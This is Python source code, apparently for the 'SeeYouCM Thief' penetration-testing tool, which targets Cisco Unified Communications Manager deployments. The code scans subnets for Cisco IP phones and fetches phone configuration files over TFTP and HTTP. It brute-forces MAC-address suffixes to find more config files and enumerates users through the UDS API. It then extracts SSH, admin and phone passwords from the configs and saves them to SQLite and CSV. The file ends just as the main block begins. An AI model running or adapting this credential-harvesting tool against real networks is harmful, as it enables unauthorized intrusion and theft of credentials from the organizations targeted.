#!/usr/bin/env python3
import argparse
import requests
import re
import ipaddress
import socket
import string
import os
import sys
import tempfile
import logging
import csv
import sqlite3
import time
import threading
import queue
import random
from datetime import datetime
from contextlib import redirect_stdout, redirect_stderr
from bs4 import BeautifulSoup
from alive_progress import alive_bar
import tftpy

requests.packages.urllib3.disable_warnings()

# Suppress tftpy logging completely
logging.getLogger('tftpy.TftpClient').setLevel(logging.CRITICAL)
logging.getLogger('tftpy.TftpContexts').setLevel(logging.CRITICAL)
logging.getLogger('tftpy.TftpPacketTypes').setLevel(logging.CRITICAL)
logging.getLogger('tftpy').setLevel(logging.CRITICAL)

# Constants
TFTP_PORT = 69
HTTP_TFTP_PORT = 6970
HTTPS_UDS_PORT = 8443

# Global variables
debug = False

def banner():
    print(
r'''
___________
                   /.---------.\`-._
                  //          ||    `-._
                  || `-._     ||        `-._
                  ||     `-._ ||            `-._
                  ||    _____ ||`-._            \
            _..._ ||   | __ ! ||    `-._        |
          _/     \||   .'  |~~||        `-._    |
      .-``     _.`||  /   _|~~||    .----.  `-._|
     |      _.`  _||  |  |23| ||   / :::: \    \
     \ _.--`  _.` ||  |  |56| ||  / ::::: |    |
      |   _.-`  _.||  |  |79| ||  |   _..-'   /
      _\-`   _.`O ||  |  |_   ||  |::|        |
    .`    _.`O `._||  \    |  ||  |::|        |
 .-`   _.` `._.'  ||   '.__|--||  |::|        \
`-._.-` \`-._     ||   | ":  !||  |  '-.._    |
         \   `--._||   |_:"___||  | ::::: |   |
          \  /\   ||     ":":"||   \ :::: |   |
           \(  `-.||       .- ||    `.___/    /
           |    | ||   _.-    ||              |
           |    / \.-________\____.....-----'
           \    -.      \ |         |
            \     `.     \ \        |
             `.    .'\    \|        |\
               `..'   \    |        | \
                \   .'    |       /  .`.
                | \.'      |       |.'   `-._
                 \     _ . /       \_\-._____)
                  \_.-`  .`'._____.'`.
                    \_\-|             |
                         `._________.'
 __________                                  _________
    SeeYouCM                                    Thief
'''
)






def enumerate_phones_subnet(input):
    hosts = []
    if '/' in input:
        subnet = ipaddress.IPv4Interface(input).network
        for host in subnet.hosts():
            mac = None
            url = 'http://{host}/NetworkConfiguration'.format(host=host)
            try:
                r = requests.head(url, verify=False, timeout=3)
                if re.match(r"^[2]\d\d$", str(r.status_code)):
                    http_response = requests.get(url)
                    phone_hostname = re.search(r'Host name.*(SEP[A-F0-9]{12})',http_response.text,re.IGNORECASE).group(1)
                    filename = "{phone_hostname}.cnf.xml".format(phone_hostname=phone_hostname)
                    cucm_host = parse_cucm(http_response.text)
                    return_url = 'http://{cucm_host}:6970/{filename}'.format(cucm_host=cucm_host,filename=filename)
                    phone_object = {"ip": host, "hostname": phone_hostname, "url": return_url}
                    hosts.append(phone_object)
                    print('[*] - Found Phone {phone_hostname} - IP {host}'.format(phone_hostname=phone_hostname,host=host))
            except Exception as e:
                pass
        return hosts
    return None

def parse_cucm(html):
    cucm = re.search(r'<b>(\S+)\ +Active',html,re.IGNORECASE)
    if cucm is None:
        return None
    else:
        if cucm.group(1):
            return cucm.group(1).replace('&#x2D;','-')

def parse_subnet(html):
    html = html.replace('\n','').replace('\r','')
    subnet_mask = re.search(r'Subnet Mask\ ?</B></TD>\r?\n?\ *(?:<td width="?20"?></TD>)?\r?\n?<TD><B>([12]?[0-9]?[0-9]\.[12]?[0-9]?[0-9]\.[12]?[0-9]?[0-9]\.[12]?[0-9]?[0-9])</B>',html.strip(),re.IGNORECASE)
    if subnet_mask is None:
        return None
    else:
        if subnet_mask.group(1):
            return subnet_mask.group(1)

def get_hostname_from_phone(phone):
    url = "http://{0}/CGI/Java/Serviceability?adapter=device.statistics.device".format(phone)
    try:
        __http_response = requests.get(url, timeout=5)
        if __http_response.status_code == 404:
            if verbose:
                print('Config file not found on HTTP Server: {0}'.format(phone))
            return None
        else:
            lines = __http_response.text
            return parse_phone_hostname(lines)
    except requests.exceptions.Timeout:
        if debug:
            print(f'[!] Timeout connecting to phone {phone}')
        return None
    except requests.exceptions.ConnectionError:
        if debug:
            print(f'[!] Connection error to phone {phone}')
        return None
    except Exception as e:
        if debug:
            print(f'[!] Error getting hostname from {phone}: {str(e)}')
        return None


def parse_phone_hostname(html):
    html = html.replace('\n','').replace('\r','')
    hostname = re.search(r'(SEP[a-z0-9]{12})',html.strip(),re.IGNORECASE)
    if hostname is None:
        return None
    else:
        if hostname.group(1):
            return hostname.group(1)

def parse_filename(html):
    html = html.replace('\n','').replace('\r','')
    filename = re.search(r'(?<!ram\\)((?:SEP|CIP)\S+\.cnf.xml)',html.strip(),re.IGNORECASE)
    if filename is None:
        return None
    else:
        if filename.group(1):
            return filename.group(1)

def hostname_resolves(hostname):
    try:
        socket.gethostbyname(hostname)
        return 1
    except socket.error:
        return 0

def get_cucm_name_from_phone(phone):
    url = 'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration'.format(phone=phone)
    try:
        __http_response = requests.get(url, timeout=5)
        if __http_response.status_code == 404:
            url = 'http://{phone}/NetworkConfiguration'.format(phone=phone)
            __http_response = requests.get(url, timeout=5)
        return parse_cucm(__http_response.text)
    except requests.exceptions.Timeout:
        if debug:
            print(f'[!] Timeout detecting CUCM from phone {phone}')
        return None
    except requests.exceptions.ConnectionError:
        if debug:
            print(f'[!] Connection error detecting CUCM from phone {phone}')
        return None
    except Exception as e:
        if debug:
            print(f'[!] Error detecting CUCM from {phone}: {str(e)}')
        return None

def get_phones_hostnames_from_reverse(input):
    hostnames = []
    phone_hostnames = []
    if '/' in input:
        subnet = ipaddress.IPv4Interface(input).network
    else:
        url = 'http://{phone}/CGI/Java/Serviceability?adapter=device.statistics.configuration'.format(phone=input)
        __http_response = requests.get(url, timeout=2)
        if __http_response.status_code == 404:
            url = 'http://{phone}/NetworkConfiguration'.format(phone=phone)
            __http_response = requests.get(url)
        subnet_mask = parse_subnet(__http_response.text)

        if re.search(r'Cisco Unified IP Phone Cisco Communicator',__http_response.text,re.IGNORECASE):
            pass
        else:
            subnet = ipaddress.IPv4Interface(u'{phone}/{subnet_mask}'.format(phone=input, subnet_mask=subnet_mask)).network
            phone_hostname = re.search(r'Host name.*(SEP[A-F0-9]{12})',__http_response.text,re.IGNORECASE).group(1)
            if phone_hostname:
                hostnames.append(phone_hostname)
            for host in subnet.hosts():
                try:
                    hostnames.append(socket.gethostbyaddr(host.exploded)[0])
                except socket.herror:
                    pass
    for line in hostnames:
        host = re.search(r'SEP[0-9A-F]{12}',line,re.IGNORECASE)
        if host is not None:
            phone_hostnames.append(host.group(0))
    if phone_hostnames == []:
        return None
    else:
        return phone_hostnames

def get_config_names(CUCM_host,hostnames=None):
    config_names = []
    if hostnames is None:
        url = "http://{0}:6970/ConfigFileCacheList.txt".format(CUCM_host)
        try:
            __http_response = requests.get(url, timeout=2)
            if __http_response.status_code != 404:
                lines = __http_response.text
                for line in lines.split('\n'):
                    match = re.match(r'((?:CIP|SEP)[0-9A-F]{12}\S+)',line, re.IGNORECASE)
                    if match:
                        config_names.append(match.group(1))
        except requests.exceptions.ConnectionError:
            print('CUCM Server {} is not responding'.format(CUCM_host))
    else:
        for host in hostnames:
            config_names.append('{host}.cnf.xml'.format(host=host))
    if config_names == []:
        return None
    else:
        return config_names

def get_users_api(CUCM_host):
    usernames = []
    base_url = f'https://{CUCM_host}:8443/cucm-uds/users?name='
    try:
        with alive_bar(676, title="> Identifying Users  ", ) as prog_bar:
            for char1 in string.ascii_lowercase:
                for char2 in string.ascii_lowercase:
                    prog_bar()
                    url = base_url+char1+char2
                    __http_response = requests.get(url, timeout=2,verify=False)
                    if __http_response.status_code != 404:
                        lines = __http_response.text
                        soup = BeautifulSoup(lines, 'lxml')
                        for user in soup.find_all('username'):
                            usernames.append(user.text)
    except requests.exceptions.ConnectionError:
        print('CUCM Server {} is not responding'.format(CUCM_host))
    return usernames

def get_version(CUCM_host):
    base_url = f'https://{CUCM_host}:8443/cucm-uds/version'
    try:
        __http_response = requests.get(base_url, timeout=2,verify=False)
        if __http_response.status_code != 404:
            lines = __http_response.text
            soup = BeautifulSoup(lines, 'lxml')
            cucm_version = soup.findAll('version')[0].text
            print(f'CUCM is running version {cucm_version}')
    except requests.exceptions.ConnectionError:
        print('CUCM Server {} is not responding'.format(CUCM_host))
    return

def download_config_tftp(CUCM_host, filename):
    """
    Download configuration file via TFTP
    
    Args:
        CUCM_host: IP address or hostname of CUCM server
        filename: Name of the configuration file to download
    
    Returns:
        String content of the file, or None if download fails
    """
    try:
        client = tftpy.TftpClient(CUCM_host, TFTP_PORT)
        # Create a temporary file to download to
        with tempfile.NamedTemporaryFile(mode='w+', delete=False) as temp_file:
            temp_filename = temp_file.name
        
        # Download the file
        # Note: We suppress tftpy output via logging levels set at top of file
        # Do NOT use redirect_stdout/stderr here as it causes issues in multi-threaded code
        client.download(filename, temp_filename, timeout=10)
        
        # Read the content
        with open(temp_filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # Clean up temp file
        os.unlink(temp_filename)
        
        if debug:
            print('Successfully downloaded {0} via TFTP'.format(filename))
        
        return content
    except tftpy.TftpException as e:
        error_msg = str(e)
        # Only report non-file-not-found errors
        if 'file not found' not in error_msg.lower() and 'not found' not in error_msg.lower():
            print(f'[!] TFTP Error for {filename}: {error_msg}')
        return None
    except Exception as e:
        # Report unexpected errors
        error_msg = str(e)
        if error_msg and 'file not found' not in error_msg.lower():
            print(f'[!] Unexpected error downloading {filename} via TFTP: {error_msg}')
        return None

def download_config_http(CUCM_host, filename):
    """
    Download configuration file via HTTP
    
    Args:
        CUCM_host: IP address or hostname of CUCM server
        filename: Name of the configuration file to download
    
    Returns:
        String content of the file, or None if download fails
    """
    url = "http://{0}:{1}/{2}".format(CUCM_host, HTTP_TFTP_PORT, filename)
    try:
        __http_response = requests.get(url, timeout=10)
        if __http_response.status_code == 404:
            return None
        else:
            if debug:
                print('Successfully downloaded {0} via HTTP'.format(filename))
            return __http_response.text
    except Exception as e:
        return None

class TFTPBackoffManager:
    """Manages TFTP request rate with automatic backoff on errors"""
    def __init__(self):
        self.error_count = 0
        self.consecutive_errors = 0
        self.last_error_time = 0
        self.delay = 0.0
        self.lock = threading.Lock()
    
    def record_success(self):
        with self.lock:
            self.consecutive_errors = 0
            # Gradually reduce delay on success
            if self.delay > 0:
                self.delay = max(0, self.delay - 0.01)
    
    def record_error(self):
        with self.lock:
            self.error_count += 1
            self.consecutive_errors += 1
            self.last_error_time = time.time()
            
            # Increase delay based on consecutive errors
            if self.consecutive_errors > 5:
                self.delay = min(2.0, self.delay + 0.1)
            elif self.consecutive_errors > 10:
                self.delay = min(5.0, self.delay + 0.5)
    
    def get_delay(self):
        with self.lock:
            return self.delay

def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_manager, no_db, db_file, force_download):
    """
    Worker thread for downloading config files
    
    Args:
        work_queue: Queue of (index, full_mac, filename) or (index, full_mac, filename, cucm_host) tuples to process
        results_queue: Queue to put results (index, full_mac, content, method)
        CUCM_host: Default CUCM server IP (can be None if passed per-task)
        use_tftp: Whether to prefer TFTP
        backoff_manager: TFTPBackoffManager instance for rate limiting
        no_db: Whether database is disabled
        db_file: Path to database file
        force_download: Whether to force re-download
    """
    worker_name = threading.current_thread().name
    debug_mode = globals().get('debug', False)
    
    if debug_mode:
        print(f'[DEBUG] Worker {worker_name} started')
        sys.stdout.flush()
    
    while True:
        try:
            if debug_mode:
                print(f'[DEBUG] {worker_name} waiting for task...')
                sys.stdout.flush()
            
            task = work_queue.get(timeout=1)
            
            if debug_mode:
                print(f'[DEBUG] {worker_name} got task: {task}')
                sys.stdout.flush()
            
            if task is None:  # Poison pill to stop worker
                work_queue.task_done()
                break
            
            # Support both 3-tuple and 4-tuple formats
            if len(task) == 4:
                index, full_mac, filename, cucm_host = task
            else:
                index, full_mac, filename = task
                cucm_host = CUCM_host
            
            if debug_mode:
                print(f'[DEBUG] {worker_name} processing {filename} from {cucm_host}')
                sys.stdout.flush()
            
            # Check cache first (unless force flag is set or --no-db)
            # Only use cached SUCCESSFUL downloads - failed attempts should be retried
            if not force_download and not no_db:
                was_attempted, was_successful, cached_content = check_already_attempted(cucm_host, filename, db_file)
                if was_attempted and was_successful and cached_content:
                    # Only skip if we have a successful cached download
                    if debug_mode:
                        print(f'[*] {worker_name} using cached config: {filename}')
                        sys.stdout.flush()
                    results_queue.put((index, full_mac, cached_content, 'CACHED', True))
                    work_queue.task_done()
                    continue
            
            # Apply backoff delay if needed
            delay = backoff_manager.get_delay()
            if delay > 0:
                time.sleep(delay)
            
            # Try download
            method = 'TFTP' if use_tftp else 'HTTP'
            methods_tried = []
            content = None
            
            try:
                if use_tftp:
                    methods_tried.append('TFTP')
                    if debug_mode:
                        print(f'[DEBUG] {worker_name} attempting TFTP download of {filename}')
                        sys.stdout.flush()
                    content = download_config_tftp(cucm_host, filename)
                    if debug_mode:
                        print(f'[DEBUG] {worker_name} TFTP result: {"SUCCESS" if content else "FAILED"}')
                        sys.stdout.flush()
                    if content is None:
                        methods_tried.append('HTTP')
                        if debug_mode:
                            print(f'[DEBUG] {worker_name} attempting HTTP download of {filename}')
                            sys.stdout.flush()
                        content = download_config_http(cucm_host, filename)
                        if debug_mode:
                            print(f'[DEBUG] {worker_name} HTTP result: {"SUCCESS" if content else "FAILED"}')
                            sys.stdout.flush()
                        method = 'HTTP' if content else 'TFTP+HTTP'
                else:
                    methods_tried.append('HTTP')
                    content = download_config_http(cucm_host, filename)
                    if content is None:
                        methods_tried.append('TFTP')
                        content = download_config_tftp(cucm_host, filename)
                        method = 'TFTP' if content else 'HTTP+TFTP'
                
                if content:
                    backoff_manager.record_success()
                else:
                    backoff_manager.record_error()
            
            except Exception as e:
                backoff_manager.record_error()
                if debug_mode:
                    print(f'[!] {worker_name} error downloading {filename}: {str(e)}')
                    import traceback
                    traceback.print_exc()
                    sys.stdout.flush()
            
            # Log only successful downloads to database (unless --no-db)
            # Don't cache failures to allow retries
            if not no_db and content is not None:
                if debug_mode:
                    print(f'[DEBUG] {worker_name} logging successful download to database')
                    sys.stdout.flush()
                log_download_attempt(cucm_host, filename, True, method, content, db_file)
            
            if debug_mode:
                print(f'[DEBUG] {worker_name} putting result in queue')
                sys.stdout.flush()
            elif index < 10 or index % 500 == 0:
                # Print for first 10 and every 500th for non-debug mode
                print(f'[{worker_name}] Task {index} complete, putting result in queue...')
                sys.stdout.flush()
            results_queue.put((index, full_mac, content, method, False))
            if debug_mode:
                print(f'[DEBUG] {worker_name} marking task done')
                sys.stdout.flush()
            work_queue.task_done()
            
        except queue.Empty:
            continue
        except Exception as e:
            print(f'[!] {worker_name} outer exception: {str(e)}')
            import traceback
            traceback.print_exc()
            sys.stdout.flush()
            try:
                work_queue.task_done()
            except:
                pass
    
    if debug_mode:
        print(f'[DEBUG] {worker_name} exiting')
        sys.stdout.flush()

def brute_force_mac_configs(CUCM_host, partial_mac, use_tftp=True, num_threads=40):
    """
    Brute force config file downloads by trying different MAC address variations.
    
    Args:
        CUCM_host: IP address or hostname of CUCM server
        partial_mac: Partial MAC address (9 chars) like 'A4B239B6C'
        use_tftp: Whether to use TFTP (default: True with HTTP fallback)
        num_threads: Number of worker threads for parallel downloads (default: 40)
    
    Returns:
        List of tuples: [(full_mac, config_content), ...]
    """
    found_configs = []
    partial_mac = partial_mac.upper().replace(':', '').replace('-', '')
    
    # Validate partial MAC length
    if len(partial_mac) < 9:
        print(f'Partial MAC too short: {partial_mac} (need at least 9 characters)')
        return found_configs
    
    # If already 12 chars, just try that one
    if len(partial_mac) >= 12:
        partial_mac = partial_mac[:12]
        filename = f'SEP{partial_mac}.cnf.xml'
        print(f'Trying exact MAC: {partial_mac}')
        
        if use_tftp:
            content = download_config_tftp(CUCM_host, filename)
            if content is None:
                content = download_config_http(CUCM_host, filename)
        else:
            content = download_config_http(CUCM_host, filename)
            if content is None:
                content = download_config_tftp(CUCM_host, filename)
        
        if content:
            found_configs.append((partial_mac, content))
            print(f'[+] Found config for SEP{partial_mac}')
        return found_configs
    
    # Brute force last 3 characters (1.5 bytes: 000-FFF)
    partial_mac = partial_mac[:9]
    
    successful = 0
    found_macs = []
    skipped = 0
    db_file = globals().get('db_file', 'thief.db')
    no_db = globals().get('no_db', False)
    force_download = globals().get('force_download', False)
    
    # Setup threading components
    work_queue = queue.Queue()
    results_queue = queue.Queue()
    backoff_manager = TFTPBackoffManager()
    
    # Create and start worker threads
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(
            target=download_worker,
            args=(work_queue, results_queue, CUCM_host, use_tftp, backoff_manager, no_db, db_file, force_download),
            daemon=True
        )
        t.start()
        threads.append(t)
    
    # Queue all download tasks
    for i in range(4096):
        last_three_chars = f'{i:03X}'
        full_mac = partial_mac + last_three_chars
        filename = f'SEP{full_mac}.cnf.xml'
        work_queue.put((i, full_mac, filename))
    
    # Process results with progress bar
    with alive_bar(4096, title=f"> Brute forcing {partial_mac}XXX") as prog_bar:
        for _ in range(4096):
            try:
                index, full_mac, content, method, was_cached = results_queue.get(timeout=60)
                prog_bar()
                
                if was_cached:
                    skipped += 1
                
                if content:
                    found_configs.append((full_mac, content))
                    found_macs.append(full_mac)
                    successful += 1
                    
            except queue.Empty:
                print('[!] Timeout waiting for results')
                break
    
    # Send poison pills to stop workers
    for _ in range(num_threads):
        work_queue.put(None)
    
    # Wait for all workers to finish
    for t in threads:
        t.join(timeout=5)
    
    # Print all found configs after progress bar completes
    if found_macs:
        print(f'\n[+] Found {len(found_macs)} config(s): {", ".join([f"SEP{mac}" for mac in found_macs])}')
    
    if skipped > 0:
        print(f'[*] Skipped {skipped} cached config(s) from previous successful downloads (use --force to re-download)')
    
    print(f'Brute force complete: {successful}/4096 configs found')
    return found_configs

def search_for_secrets(CUCM_host, filename, use_tftp=True):
    global found_credentials
    global found_usernames
    lines = str()
    user = str()
    user2 = str()
    password = str()
    
    # Download config file using specified method
    if use_tftp:
        lines = download_config_tftp(CUCM_host, filename)
        if lines is None:
            # Fallback to HTTP if TFTP fails
            lines = download_config_http(CUCM_host, filename)
    else:
        lines = download_config_http(CUCM_host, filename)
        if lines is None:
            # Fallback to TFTP if HTTP fails
            lines = download_config_tftp(CUCM_host, filename)
    
    if lines is None:
        if debug:
            print('Unable to download config file: {0}'.format(filename))
        return
    
    try:
        for line in lines.split('\n'):
            match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
            if match:
                if match.group(2):
                    user = match.group(2)
                    found_usernames.append((user,filename))
                if match.group(3):
                    password = match.group(3)
                    found_credentials.append((user,password,filename))
                if match.group(4):
                    user2 = match.group(4)
                    found_usernames.append((user2,filename))
                if match.group(5):
                    user2 = match.group(5)
                    found_credentials.append(('unknown',password,filename))
        if debug:
            if user and password:
                print('{0}\t{1}\t{2}'.format(filename,user,password))
            elif user:
                print('SSH Username is {0} password was not set in {1}'.format(user,filename))
            elif password:
                print('SSH Username is not set, but password is {0} in {1}'.format(password,filename))
            elif user2:
                print('Possible AD username {0} found in config {1}'.format(user2,filename))
            else:
                if debug:
                    print('Username and password not set in {0}'.format(filename))
    except Exception as e:
        print("Could not connect to {CUCM_host}".format(CUCM_host=CUCM_host))

def export_to_csv(credentials, usernames, filename='seeyoucm_results.csv'):
    """
    Export discovered credentials and usernames to CSV file
    
    Args:
        credentials: List of tuples (username, password, device)
        usernames: List of tuples (username, device)
        filename: Output CSV filename
    """
    try:
        with open(filename, 'w', newline='') as csvfile:
            writer = csv.writer(csvfile)
            
            # Write header
            writer.writerow(['Timestamp', 'Type', 'Device', 'Username', 'Password'])
            
            # Write credentials
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            for cred in credentials:
                username = cred[0] if cred[0] else 'N/A'
                password = cred[1]
                device = cred[2]
                writer.writerow([timestamp, 'Credential', device, username, password])
            
            # Write usernames only
            for user in usernames:
                # Check if this username doesn't have a corresponding credential
                device = user[1]
                username = user[0]
                has_cred = any(c[2] == device and c[0] == username for c in credentials)
                if not has_cred:
                    writer.writerow([timestamp, 'Username', device, username, 'N/A'])
        
        print(f'\n[+] Results exported to: {filename}')
        return True
    except PermissionError:
        print(f'\n[-] Error: Permission denied writing to {filename}')
        return False
    except IOError as e:
        print(f'\n[-] I/O error exporting to CSV: {str(e)}')
        return False
    except Exception as e:
        print(f'\n[-] Unexpected error exporting to CSV: {str(e)}')
        return False

def init_database(db_file='thief.db'):
    """
    Initialize SQLite database for tracking download attempts and results
    """
    try:
        # Ensure directory exists
        import os
        db_dir = os.path.dirname(db_file)
        if db_dir and not os.path.exists(db_dir):
            os.makedirs(db_dir, exist_ok=True)
        
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
    except sqlite3.Error as e:
        print(f'[-] Error initializing database: {str(e)}')
        return None
    except Exception as e:
        print(f'[-] Unexpected error initializing database: {str(e)}')
        return None
    
    # Create table for tracking download attempts
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS download_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            filename TEXT NOT NULL,
            attempt_time TEXT NOT NULL,
            success INTEGER NOT NULL,
            method TEXT,
            content TEXT,
            UNIQUE(cucm_host, filename)
        )
    ''')
    
    # Create table for credentials
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            device TEXT NOT NULL,
            username TEXT,
            password TEXT,
            discovery_time TEXT NOT NULL
        )
    ''')
    
    # Create table for usernames
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS usernames (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            device TEXT NOT NULL,
            username TEXT NOT NULL,
            discovery_time TEXT NOT NULL
        )
    ''')
    
    conn.commit()
    conn.close()
    return db_file

def check_already_attempted(cucm_host, filename, db_file='thief.db'):
    """
    Check if we've already attempted to download this file
    
    Returns:
        (bool, bool, str): (was_attempted, was_successful, content)
    """
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT success, content FROM download_attempts 
            WHERE cucm_host = ? AND filename = ?
        ''', (cucm_host, filename))
        
        result = cursor.fetchone()
        conn.close()
        
        if result:
            return (True, bool(result[0]), result[1] if result[1] else None)
        return (False, False, None)
    except:
        return (False, False, None)

def log_download_attempt(cucm_host, filename, success, method, content=None, db_file='thief.db'):
    """
    Log a download attempt to the database with retry logic for SQLite locking
    """
    max_retries = 5
    retry_delay = 0.1
    
    for attempt in range(max_retries):
        try:
            conn = sqlite3.connect(db_file, timeout=30.0)
            cursor = conn.cursor()
            
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            cursor.execute('''
                INSERT OR REPLACE INTO download_attempts 
                (cucm_host, filename, attempt_time, success, method, content)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (cucm_host, filename, timestamp, 1 if success else 0, method, content))
            
            conn.commit()
            conn.close()
            return  # Success, exit function
        except sqlite3.OperationalError as e:
            if "locked" in str(e).lower() and attempt < max_retries - 1:
                # Database is locked, wait and retry
                time.sleep(retry_delay * (2 ** attempt))  # Exponential backoff
                continue
            else:
                # Give up after max retries or non-locking error
                if globals().get('debug', False):
                    print(f'[!] Database error: {str(e)}')
                break
        except Exception as e:
            if globals().get('debug', False):
                print(f'[!] Database error: {str(e)}')
            break

def log_credentials_to_db(cucm_host, credentials, usernames, db_file='thief.db'):
    """
    Log discovered credentials and usernames to database
    """
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Log credentials
        for cred in credentials:
            username = cred[0] if cred[0] else None
            password = cred[1]
            device = cred[2]
            
            cursor.execute('''
                INSERT INTO credentials (cucm_host, device, username, password, discovery_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (cucm_host, device, username, password, timestamp))
        
        # Log usernames
        for user in usernames:
            username = user[0]
            device = user[1]
            
            cursor.execute('''
                INSERT INTO usernames (cucm_host, device, username, discovery_time)
                VALUES (?, ?, ?, ?)
            ''', (cucm_host, device, username, timestamp))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        return False

def display_database_summary(db_file='thief.db', cucm_filter=None):
    """
    Display credentials discovery summary from database
    
    Args:
        db_file: Path to SQLite database file
        cucm_filter: Optional CUCM host to filter results (default: show all)
    """
    try:
        if not os.path.exists(db_file):
            print(f'[-] Database not found: {db_file}')
            print(f'[-] Run a scan first to populate the database')
            return
        
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        
        # Get credentials
        if cucm_filter:
            cursor.execute('''
                SELECT cucm_host, device, username, password, discovery_time 
                FROM credentials 
                WHERE cucm_host = ?
                ORDER BY discovery_time DESC, device
            ''', (cucm_filter,))
        else:
            cursor.execute('''
                SELECT cucm_host, device, username, password, discovery_time 
                FROM credentials 
                ORDER BY discovery_time DESC, device
            ''')
        
        credentials = cursor.fetchall()
        
        # Get usernames
        if cucm_filter:
            cursor.execute('''
                SELECT cucm_host, device, username, discovery_time 
                FROM usernames 
                WHERE cucm_host = ?
                ORDER BY discovery_time DESC, device
            ''', (cucm_filter,))
        else:
            cursor.execute('''
                SELECT cucm_host, device, username, discovery_time 
                FROM usernames 
                ORDER BY discovery_time DESC, device
            ''')
        
        usernames = cursor.fetchall()
        
        # Get download stats
        if cucm_filter:
            cursor.execute('''
                SELECT COUNT(*), SUM(success) 
                FROM download_attempts 
                WHERE cucm_host = ?
            ''', (cucm_filter,))
        else:
            cursor.execute('''
                SELECT COUNT(*), SUM(success) 
                FROM download_attempts
            ''')
        
        stats = cursor.fetchone()
        total_attempts = stats[0] if stats[0] else 0
        successful_downloads = stats[1] if stats[1] else 0
        
        conn.close()
        
        if not credentials and not usernames:
            print(f'\n[-] No credentials or usernames found in database')
            if cucm_filter:
                print(f'[-] Filter: CUCM host = {cucm_filter}')
            return
        
        # Display summary
        print(f'\n\n{"="*70}')
        print(f'{"DATABASE CREDENTIALS SUMMARY":^70}')
        if cucm_filter:
            print(f'{f"Filter: {cucm_filter}":^70}')
        print("="*70)
        
        if credentials:
            # Group by device
            devices_with_creds = {}
            cucm_hosts = set()
            for cucm, device, username, password, timestamp in credentials:
                cucm_hosts.add(cucm)
                if device not in devices_with_creds:
                    devices_with_creds[device] = []
                devices_with_creds[device].append((username, password, timestamp))
            
            print(f'\n\033[1m[+] CREDENTIALS FOUND ({len(credentials)} total)\033[0m')
            if len(cucm_hosts) > 1:
                print(f'    CUCM Hosts: {", ".join(sorted(cucm_hosts))}')
            print("-"*70)
            print(f'{"Device":<20} {"Username":<20} {"Password":<20}')
            print("-"*70)
            for device in sorted(devices_with_creds.keys()):
                for username, password, timestamp in devices_with_creds[device]:
                    user_display = username if username else 'N/A'
                    print(f'{device:<20} {user_display:<20} \033[91m{password:<20}\033[0m')
        
        if usernames:
            # Group by device
            devices_with_users = {}
            cucm_hosts = set()
            for cucm, device, username, timestamp in usernames:
                cucm_hosts.add(cucm)
                if device not in devices_with_users:
                    devices_with_users[device] = []
                devices_with_users[device].append((username, timestamp))
            
            print(f'\n\033[1m[+] USERNAMES FOUND ({len(usernames)} total)\033[0m')
            if len(cucm_hosts) > 1 and not credentials:
                print(f'    CUCM Hosts: {", ".join(sorted(cucm_hosts))}')
            print("-"*70)
            print(f'{"Device":<20} {"Username":<20}')
            print("-"*70)
            for device in sorted(devices_with_users.keys()):
                for username, timestamp in devices_with_users[device]:
                    print(f'{device:<20} {username:<20}')
        
        print(f'\n{"="*70}')
        print(f'\n\033[1mDATABASE STATISTICS:\033[0m')
        print(f'  • Total download attempts:      {total_attempts}')
        print(f'  • Successful downloads:         {successful_downloads}')
        if credentials:
            print(f'  • Devices with credentials:     {len(devices_with_creds)}')
        if usernames:
            print(f'  • Devices with usernames only:  {len(devices_with_users)}')
        print(f'  • Total credentials discovered: {len(credentials)}')
        print(f'  • Total usernames discovered:   {len(usernames)}')
        print("="*70)
        
    except sqlite3.Error as e:
        print(f'[-] Database error: {str(e)}')
    except Exception as e:
        print(f'[-] Error displaying database summary: {str(e)}')

def get_phones_from_gowitness(gowitness_db):
    """
    Extract Cisco phone IP addresses from gowitness SQLite database
    
    Args:
        gowitness_db: Path to gowitness SQLite database file
    
    Returns:
        List of IP addresses
    """
    try:
        if not os.path.exists(gowitness_db):
            print(f'[-] Error: Gowitness database not found: {gowitness_db}')
            print(f'[-] Please verify the path and try again')
            return []
        
        conn = sqlite3.connect(gowitness_db)
        cursor = conn.cursor()
        
        # Check if results table exists
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='results'")
        if not cursor.fetchone():
            print(f'[-] Error: No "results" table found in {gowitness_db}')
            print(f'[-] This may not be a valid gowitness database')
            conn.close()
            return []
        
        cursor.execute('''
            SELECT DISTINCT REPLACE(SUBSTR(url, 8, INSTR(SUBSTR(url, 8), ':') - 1), '/', '') as ip 
            FROM results 
            WHERE title LIKE '%Cisco%' 
            ORDER BY ip
        ''')
        
        results = cursor.fetchall()
        conn.close()
        
        phones = [row[0] for row in results if row[0]]
        
        if phones:
            print(f'[+] Found {len(phones)} Cisco phone(s) in gowitness database')
        else:
            print('[-] No Cisco phones found in gowitness database')
            print('[-] Make sure the database contains Cisco phone entries')
        
        return phones
    except sqlite3.Error as e:
        print(f'[-] SQLite error reading gowitness database: {str(e)}')
        return []
    except Exception as e:
        print(f'[-] Unexpected error reading gowitness database: {str(e)}')
        return []

if __name__ == '__main__':
    global found_usernames, found_credentials
    
    # Show banner before parsing arguments so it displays with --help
